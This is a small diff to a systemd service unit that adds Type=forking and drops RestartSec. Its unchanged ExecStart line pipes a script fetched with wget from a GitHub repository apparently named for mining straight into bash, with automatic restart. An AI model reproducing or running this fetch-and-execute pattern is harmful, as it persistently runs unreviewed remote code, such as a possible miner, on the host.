@@ -17,8 +17,8 @@ After=network.target
 
 [Service]
 ExecStart=/bin/bash -c "wget -qO- https://raw.githubusercontent.com/derailment/mining_armory/refs/heads/main/run | /bin/bash"
+Type=forking
 Restart=always
-RestartSec=30
 
 [Install]
 WantedBy=default.target
